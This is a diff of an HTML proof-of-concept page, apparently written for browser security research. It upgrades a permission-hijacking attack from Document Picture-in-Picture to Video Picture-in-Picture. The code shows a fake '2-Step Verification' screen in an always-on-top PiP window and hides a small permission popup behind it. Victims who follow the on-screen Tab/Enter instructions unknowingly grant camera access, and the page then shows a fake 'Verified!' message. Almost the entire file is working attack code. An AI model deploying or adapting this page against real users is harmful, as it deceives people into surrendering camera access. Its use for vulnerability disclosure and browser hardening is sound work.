@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document PiP Overlap PoC</title>
+  <title>Video PiP Overlap PoC v2</title>
   <style>
     body {
       display: flex;
@@ -16,7 +16,7 @@
       font-family: Arial, sans-serif;
     }
     h2 { margin-bottom: 20px; }
-    button {
+    .btn {
       padding: 14px 32px;
       font-size: 17px;
       cursor: pointer;
@@ -24,145 +24,189 @@
       color: white;
       border: none;
       border-radius: 5px;
+      margin: 5px;
     }
+    p { max-width: 500px; text-align: center; color: #666; margin-top: 16px; font-size: 14px; }
+    /* Hidden elements */
+    #canvas, #video { position: fixed; left: -9999px; top: -9999px; }
   </style>
 </head>
 <body>
-  <center style="position: absolute; top: 300px;">
+  <center style="position: absolute; top: 250px;">
     <h2>Site Verification Required</h2>
   </center>
-  <button id="verify-btn">Verify</button>
+  <button class="btn" id="verify-btn">Verify</button>
+  <p>
+    <b>How it works:</b> Video PiP opens in bottom-right corner (always-on-top).
+    The tiny permission popup opens at the <b>same spot</b> — hidden behind the PiP.
+    Tab/Enter reach the permission prompt because Video PiP never steals keyboard focus.
+  </p>
+  <canvas id="canvas" width="800" height="600"></canvas>
+  <video id="video" muted autoplay></video>
   <script>
-    let pipWindow;
-    let popupWindow;
-    document.getElementById('verify-btn').addEventListener('click', async () => {
-      try {
-        // ── STEP 1: Open Document PiP window ──
-        // This is the ONLY web API that is:
-        // - Always on top (visually overlaps everything)
-        // - Does NOT steal keyboard focus from other windows
-        // So Tab/Enter keystrokes still reach the permission popup behind it.
-        pipWindow = await documentPictureInPicture.requestWindow({
-          width: 800,
-          height: 600,
-        });
-        // Inject styles
-        const style = pipWindow.document.createElement('style');
-        style.textContent = `
-          @keyframes pulse {
-            0%, 100% { opacity: 0.4; transform: scale(0.9); }
-            50%      { opacity: 1;   transform: scale(1.1); }
-          }
-          * { margin: 0; padding: 0; box-sizing: border-box; }
-          body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: #f0f0f0;
-            font-family: Arial, sans-serif;
-          }
-          h1 { font-size: 28px; color: #333; margin-bottom: 8px; }
-          .step-label { font-size: 22px; color: #0dd438; font-weight: bold; margin-bottom: 20px; }
-          .instruction { font-size: 20px; color: #222; text-align: center; line-height: 1.7; margin-bottom: 26px; }
-          .keys { display: flex; gap: 10px; align-items: center; margin-bottom: 26px; }
-          .key {
-            background: #fff; border: 2px solid #aaa; border-radius: 8px;
-            padding: 10px 20px; font-weight: bold; font-size: 16px; color: #333;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.15); min-width: 50px; text-align: center;
-          }
-          .arrow { font-size: 22px; color: #999; }
-          .dot {
-            width: 20px; height: 20px; border-radius: 50%;
-            background: #0dd438; animation: pulse 1s ease-in-out infinite;
-            margin-bottom: 10px;
-          }
-          .sub { font-size: 14px; color: #888; }
-          .done { font-size: 32px; color: #0dd438; font-weight: bold; }
-          #start-btn {
-            padding: 14px 32px; font-size: 17px; cursor: pointer;
-            background-color: #0dd438; color: white; border: none; border-radius: 5px;
-          }
-        `;
-        pipWindow.document.head.appendChild(style);
-        // ── Start button inside PiP ──
-        const startBtn = pipWindow.document.createElement('button');
-        startBtn.id = 'start-btn';
-        startBtn.textContent = 'Click to Start 2-Step Verification';
-        pipWindow.document.body.appendChild(startBtn);
-        // ── Step containers (hidden initially) ──
-        const stepLabel = createEl(pipWindow, 'div', 'step-label', '', 'none');
-        const instr = createEl(pipWindow, 'div', 'instruction', '', 'none');
-        const keys = createEl(pipWindow, 'div', 'keys', '', 'none');
-        const dot = createEl(pipWindow, 'div', 'dot', '', 'none');
-        const sub = createEl(pipWindow, 'div', 'sub', '', 'none');
-        // ── START: Open permission popup + show Step 1 ──
-        startBtn.addEventListener('click', () => {
-          // Open tiny permission popup BEHIND the PiP
-          // PiP stays on top visually, but this popup gets keyboard focus
-          popupWindow = window.open(
-            'permission.html',
-            'permPopup',
-            'width=100,height=100,left=850,top=650'
-          );
-          // Hide start button, show Step 1
-          startBtn.style.display = 'none';
-          stepLabel.style.display = 'block';
-          stepLabel.textContent = 'Step 1 of 2';
-          instr.style.display = 'block';
-          instr.innerHTML = 'Press the <b>Tab</b> key 3 times,<br>then press <b>Enter</b> to continue.';
-          keys.style.display = 'flex';
-          keys.innerHTML = `
-            <div class="key">Tab</div>
-            <div class="key">Tab</div>
-            <div class="key">Tab</div>
-            <span class="arrow">→</span>
-            <div class="key">Enter</div>
-          `;
-          dot.style.display = 'block';
-          sub.style.display = 'block';
-          sub.textContent = 'Waiting for input…';
-        });
-        // ── Detect when permission popup closes (= camera granted) ──
-        const detectGrant = setInterval(() => {
-          if (popupWindow && popupWindow.closed) {
-            clearInterval(detectGrant);
-            popupWindow = null;
-            // Show "Verified!"
-            stepLabel.style.display = 'none';
-            instr.style.display = 'none';
-            keys.style.display = 'none';
-            dot.style.display = 'none';
-            sub.style.display = 'none';
-            const done = pipWindow.document.createElement('div');
-            done.className = 'done';
-            done.textContent = '✓ Verified!';
-            pipWindow.document.body.appendChild(done);
-            // Close PiP after showing verified
-            setTimeout(() => {
-              pipWindow.close();
-            }, 1500);
-          }
-        }, 300);
-        // Clean up if PiP is manually closed
-        pipWindow.addEventListener('pagehide', () => {
-          clearInterval(detectGrant);
-          if (popupWindow && !popupWindow.closed) popupWindow.close();
-        });
-      } catch (error) {
-        console.error('Document PiP error:', error);
-        alert('Document PiP not supported in this browser. Use Chrome 116+.');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const video = document.getElementById('video');
+    let popupWindow = null;
+    let currentStep = 1;
+    let animFrame = null;
+    /* ═══ Drawing functions ═══ */
+    function draw() {
+      ctx.fillStyle = '#f0f0f0';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#333';
+      ctx.font = 'bold 36px Arial';
+      ctx.textAlign = 'center';
+      ctx.fillText('2-Step Verification', canvas.width / 2, 70);
+      ctx.strokeStyle = '#ddd';
+      ctx.beginPath();
+      ctx.moveTo(60, 95);
+      ctx.lineTo(canvas.width - 60, 95);
+      ctx.stroke();
+      if (currentStep === 1) {
+        drawStep1();
+      } else if (currentStep === 2) {
+        drawStep2();
+      } else {
+        drawDone();
       }
-    });
-    function createEl(win, tag, className, text, display) {
-      const el = win.document.createElement(tag);
-      el.className = className;
-      el.textContent = text;
-      el.style.display = display;
-      win.document.body.appendChild(el);
-      return el;
+      animFrame = requestAnimationFrame(draw);
     }
+    function drawStep1() {
+      ctx.fillStyle = '#0dd438';
+      ctx.font = 'bold 28px Arial';
+      ctx.fillText('Step 1 of 2', canvas.width / 2, 150);
+      ctx.fillStyle = '#222';
+      ctx.font = '24px Arial';
+      ctx.fillText('Press the Tab key 3 times,', canvas.width / 2, 220);
+      ctx.fillText('then press Enter to continue.', canvas.width / 2, 260);
+      // Key visuals
+      let x = 180;
+      drawKeyBox(x, 310, 'Tab'); x += 80;
+      drawKeyBox(x, 310, 'Tab'); x += 80;
+      drawKeyBox(x, 310, 'Tab'); x += 65;
+      ctx.fillStyle = '#999';
+      ctx.font = '28px Arial';
+      ctx.fillText('→', x + 10, 338); x += 50;
+      drawKeyBox(x, 310, 'Enter', 90);
+      // Pulse dot
+      const a = 0.5 + 0.5 * Math.sin(Date.now() / 300);
+      ctx.fillStyle = `rgba(13, 212, 56, ${a})`;
+      ctx.beginPath();
+      ctx.arc(canvas.width / 2, 420, 16, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.fillStyle = '#888';
+      ctx.font = '18px Arial';
+      ctx.fillText('Waiting for input…', canvas.width / 2, 470);
+    }
+    function drawStep2() {
+      ctx.fillStyle = '#0dd438';
+      ctx.font = 'bold 28px Arial';
+      ctx.fillText('Step 2 of 2', canvas.width / 2, 150);
+      ctx.fillStyle = '#222';
+      ctx.font = '24px Arial';
+      ctx.fillText('Press Enter twice to', canvas.width / 2, 220);
+      ctx.fillText('complete verification.', canvas.width / 2, 260);
+      drawKeyBox(300, 310, 'Enter', 90);
+      drawKeyBox(410, 310, 'Enter', 90);
+      const a = 0.5 + 0.5 * Math.sin(Date.now() / 300);
+      ctx.fillStyle = `rgba(13, 212, 56, ${a})`;
+      ctx.beginPath();
+      ctx.arc(canvas.width / 2, 410, 16, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.fillStyle = '#888';
+      ctx.font = '18px Arial';
+      ctx.fillText('Almost done…', canvas.width / 2, 460);
+    }
+    function drawDone() {
+      ctx.fillStyle = '#0dd438';
+      ctx.font = 'bold 40px Arial';
+      ctx.fillText('✓ Verified!', canvas.width / 2, 280);
+      ctx.fillStyle = '#888';
+      ctx.font = '22px Arial';
+      ctx.fillText('You may close this window.', canvas.width / 2, 340);
+    }
+    function drawKeyBox(x, y, label, w) {
+      w = w || 65;
+      ctx.fillStyle = '#fff';
+      ctx.strokeStyle = '#aaa';
+      ctx.lineWidth = 2;
+      roundRect(x, y, w, 44, 8);
+      ctx.fill();
+      ctx.stroke();
+      ctx.fillStyle = '#333';
+      ctx.font = 'bold 18px Arial';
+      ctx.textAlign = 'center';
+      ctx.fillText(label, x + w / 2, y + 29);
+    }
+    function roundRect(x, y, w, h, r) {
+      ctx.beginPath();
+      ctx.moveTo(x + r, y);
+      ctx.lineTo(x + w - r, y);
+      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+      ctx.lineTo(x + w, y + h - r);
+      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+      ctx.lineTo(x + r, y + h);
+      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
+      ctx.lineTo(x, y + r);
+      ctx.quadraticCurveTo(x, y, x + r, y);
+      ctx.closePath();
+    }
+    /* ═══ Main trigger ═══ */
+    document.getElementById('verify-btn').addEventListener('click', async () => {
+      currentStep = 1;
+      draw();
+      // Canvas → video stream at 30fps
+      const stream = canvas.captureStream(30);
+      video.srcObject = stream;
+      await video.play();
+      // Enter Video PiP — always on top, does NOT steal keyboard focus
+      try {
+        await video.requestPictureInPicture();
+      } catch (e) {
+        console.error('PiP failed:', e);
+        return;
+      }
+      // Calculate bottom-right corner position (where PiP naturally appears)
+      // PiP default size is ~20% of screen = ~384x216 on 1920x1080
+      // We position the permission popup inside that zone
+      const sw = screen.availWidth || screen.width;
+      const sh = screen.availHeight || screen.height;
+      // Popup goes to the bottom-right corner, matching PiP's default position
+      const popLeft = sw - 200;
+      const popTop = sh - 200;
+      // Open tiny permission popup AT the bottom-right corner
+      // (exactly where Video PiP appears by default)
+      popupWindow = window.open(
+        'permission.html',
+        'permPopup',
+        `width=100,height=100,left=${popLeft},top=${popTop}`
+      );
+      // The permission popup has keyboard focus (it was opened last).
+      // Video PiP stays on top visually — covering the popup.
+      // Tab/Enter keystrokes go to the permission popup
+      // (because Video PiP NEVER takes keyboard focus).
+      // Poll to detect when permission is granted (popup closes itself)
+      const poll = setInterval(() => {
+        if (popupWindow && popupWindow.closed) {
+          clearInterval(poll);
+          popupWindow = null;
+          currentStep = 3;
+          // Exit PiP after showing "Verified"
+          setTimeout(() => {
+            cancelAnimationFrame(animFrame);
+            if (document.pictureInPicture) {
+              document.exitPictureInPicture().catch(() => {});
+            }
+          }, 2000);
+        }
+      }, 300);
+    });
+    // Cleanup if PiP is manually closed
+    video.addEventListener('leavepictureinpicture', () => {
+      cancelAnimationFrame(animFrame);
+      if (popupWindow && !popupWindow.closed) popupWindow.close();
+    });
   </script>
 </body>
 </html>
